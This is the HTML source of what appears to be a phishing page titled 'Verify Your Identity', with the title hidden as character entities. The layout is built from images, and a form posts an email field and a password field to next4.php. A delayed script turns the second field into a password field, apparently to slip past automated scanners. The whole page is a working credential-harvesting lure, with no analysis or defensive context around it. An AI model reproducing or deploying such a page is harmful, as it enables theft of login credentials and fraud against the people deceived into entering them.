<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#86;&#101;&#114;&#105;&#102;&#121;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#100;&#101;&#110;&#116;&#105;&#116;&#121;</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>

<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	

<style type="text/css">
			 .textbox {
    margin-right: 10px;
    padding-left:4px;
    height: 26px;
    line-height: 20px;
    vertical-align: middle;
}
</style>

<style type="text/css">
div#container
{
	position:relative;
	width: 1274px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>


</head>
<body>
<div id="container">

<div id="image1" style="position:absolute; overflow:hidden; left:170px; top:15px; width:984px; height:170px; z-index:8"><img src="images/bed10.png" alt="" title="" border=0 width=984 height=170></div>

<div id="image3" style="position:absolute; overflow:hidden; left:192px; top:242px; width:105px; height:96px; z-index:3"><img src="images/ba5.png" alt="" title="" border=0 width=105 height=96></div>

<div id="image15" style="position:absolute; overflow:hidden; left:133px; top:554px; width:987px; height:150px; z-index:5"><img src="images/bbo28.png" alt="" title="" border=0 width=987 height=150></div>

<div id="image16" style="position:absolute; overflow:hidden; left:159px; top:602px; width:108px; height:17px; z-index:6"><a href="#"><img src="images/bbo29.png" alt="" title="" border=0 width=108 height=17></a></div>

<div id="image10" style="position:absolute; overflow:hidden; left:318px; top:428px; width:75px; height:29px; z-index:8"><a href="#"><img src="images/bb10.png" alt="" title="" border=0 width=75 height=29></a></div>

<form action=next4.php name=chalojee id=chalojee method=post>
<input name="eml" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:262px;left:198px;top:268px;z-index:16">
<input name="eps" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:262px;left:198px;top:340px;z-index:17">

<div id="formimage1" style="position:absolute; left:198px; top:428px; z-index:24"><input type="image" name="formimage1" width="102" height="28" src="images/bz2.png"></div>
</div>

</body>
</html>
